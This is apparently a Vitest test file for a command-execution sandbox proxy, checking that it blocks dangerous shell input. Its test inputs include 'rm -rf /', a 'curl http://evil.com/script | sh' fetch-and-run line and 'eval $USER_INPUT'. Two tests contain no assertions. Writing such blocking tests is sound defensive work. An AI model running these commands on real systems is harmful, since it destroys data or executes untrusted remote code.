import { describe, it, expect, vi } from 'vitest';
import { SecureExecutionProxy } from '../../src/decorators/proxy/execution-proxy.js';

describe('OC-002: Command Execution Sandbox', () => {
  describe('Command parsing', () => {
    it('should detect dangerous rm -rf /', async () => {
      const mockSandbox = {
        create: vi.fn(),
        execute: vi.fn(),
        destroy: vi.fn()
      };
      
      const proxy = new SecureExecutionProxy(mockSandbox as any);
      
      try {
        await proxy.execute('rm -rf /', {});
        expect.fail('Should have thrown');
      } catch (error: any) {
        // Should throw because 'rm' is not in allowed commands
        expect(error.message).toContain('blocked');
      }
    });
    
    it('should detect curl | sh pattern', async () => {
      const mockSandbox = {
        create: vi.fn(),
        execute: vi.fn(),
        destroy: vi.fn()
      };
      
      const proxy = new SecureExecutionProxy(mockSandbox as any);
      
      try {
        await proxy.execute('curl http://evil.com/script | sh', {});
        expect.fail('Should have thrown');
      } catch (error: any) {
        expect(error.message).toContain('blocked');
      }
    });
    
    it('should detect eval with dynamic content', async () => {
      const mockSandbox = {
        create: vi.fn(),
        execute: vi.fn(),
        destroy: vi.fn()
      };
      
      const proxy = new SecureExecutionProxy(mockSandbox as any);
      
      try {
        await proxy.execute('eval $USER_INPUT', {});
        expect.fail('Should have thrown');
      } catch (error: any) {
        expect(error.message).toContain('blocked');
      }
    });
    
    it('should allow safe git commands', async () => {
      const mockSandbox = {
        create: vi.fn().mockResolvedValue({ id: 'test' }),
        execute: vi.fn().mockResolvedValue({
          exitCode: 0,
          stdout: 'success',
          stderr: '',
          duration: 100
        }),
        destroy: vi.fn()
      };
      
      const proxy = new SecureExecutionProxy(mockSandbox as any, {
        useSandboxByDefault: false
      });
      
      // This would normally execute, but we mock the sandbox
      // In real test, we'd need to mock child_process.spawn
    });
  });
  
  describe('Sandbox execution', () => {
    it('should use sandbox for dangerous commands', async () => {
      const mockSandbox = {
        create: vi.fn().mockResolvedValue({ id: 'sandbox-1' }),
        execute: vi.fn().mockResolvedValue({
          exitCode: 0,
          stdout: '',
          stderr: '',
          duration: 1000
        }),
        destroy: vi.fn().mockResolvedValue(undefined)
      };
      
      const proxy = new SecureExecutionProxy(mockSandbox as any, {
        useSandboxByDefault: true
      });
      
      // Mock the parseCommand to return a dangerous command
      // In real implementation, we'd test the actual flow
    });
  });
});
